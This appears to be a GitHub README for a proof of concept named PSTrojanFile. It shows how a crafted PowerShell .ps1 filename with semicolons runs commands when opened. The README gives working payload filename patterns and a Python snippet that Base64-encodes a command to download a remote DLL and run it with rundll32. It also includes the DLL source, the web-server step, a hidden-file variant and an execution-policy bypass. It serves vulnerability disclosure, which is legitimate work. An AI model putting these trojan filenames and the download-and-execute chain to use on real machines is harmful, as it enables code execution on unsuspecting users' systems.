# PSTrojanFile
Windows PowerShell Filename Code Execution POC

Since it still works, I dusted off and made minor improvements: <br> 
1) Execute a remote DLL using rundll32
2) Execute an unintended secondary PS1 script or local text-file (can be hidden)
3) Updated the PS1 Trojan Filename Creator Python3 Script

First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
Remote code execution via a specially crafted filename. <br>  

The flaw is due to semicolon ";" we can decode a Base64 command and execute straight from the PS1 filename or just exec commands.

Test;POweRsHeLL -e [BASE64 UTF-16LE PAYLOAD];.ps1 <br>  

Call commands straight away <br>  

"Testing;saps (gc -) PoC;.ps1"

Vectors: double click, drag and drop to PS shortcut

Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.

DLL Execution Example: <br>  
=======================
Create a trojan PS1 file that will try to download and execute a remote DLL named "1.d"

Python: <br>  
from base64 import b64encode <br>  

b64encode("saps  http[]//127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d, 0".encode('UTF-16LE')) <br>  

cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA

DLL Code: <br>  

#include <windows.h> <br> 

//gcc -shared -o mydll.dll mydll.c -m32 <br>  

//hyp3rlinx <br>  

void evilo(void){ <br>  

MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1); <br>  

} <br>  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ <br>  

evilo(); <br>  

return 0; <br>  

} <br>  


python -m http.server 80

Double click the trojan PS1 file. <br>  


Text-file Code Execution Example: <br> 
======================================

Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file. <br>  

"Test;saps (gc -) PoC;.ps1" <br>  

Create hidden: attrib +s +h "-" <br>  

Double click or drag and drop.

Requirements: <br>  
=====================

a) PowerShell PS1 files must be set to open with PowerShell as the default program <br>  

b) Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force <br>  

c) User must double-click, run from cmd line or drag and drop the maliciously named PS1 script <br>  

Video PoC:

![PSTrojanFile](https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/28846bd1-a8c6-48c6-8764-e95d8644520f)





https://github.com/hyp3rlinx/PSTrojanFile/assets/12366009/96955652-2ae5-4de8-bd14-2df1d21a8cfe



